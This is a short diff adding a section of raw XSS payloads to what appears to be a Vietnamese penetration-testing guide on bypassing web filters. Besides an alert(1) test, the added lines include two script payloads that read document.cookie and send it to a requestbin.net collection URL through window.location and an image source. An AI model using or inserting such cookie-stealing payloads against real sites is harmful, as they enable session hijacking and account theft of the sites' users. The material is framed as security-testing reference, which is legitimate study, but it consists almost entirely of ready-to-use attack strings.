@@ -18,3 +18,14 @@ Trong quá trình pentest ứng dụng có thể gặp nhiều trường hợp c
 Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu ví quá trình filter như người bảo vệ ứng dụng web thì quá trình bypass là quá trình luồn lách để qua mặt những người bảo vệ này. Khó thể nói có công thức nào tuyệt đối mà là sự tùy cơ ứng biến cho phù hợp từng hoàn cảnh. Hãy nhớ điều này.
 
 
+## 1. Các load js nguyên thủy (Không mask) huyền thoại 
+
+### Alert message
+```<script>alert(1);</script>```
+
+### Dùng window location
+```<script>window.location="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie)</script>```
+
+### Dùng image
+```<script>new Image().src="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie);</script>```
+
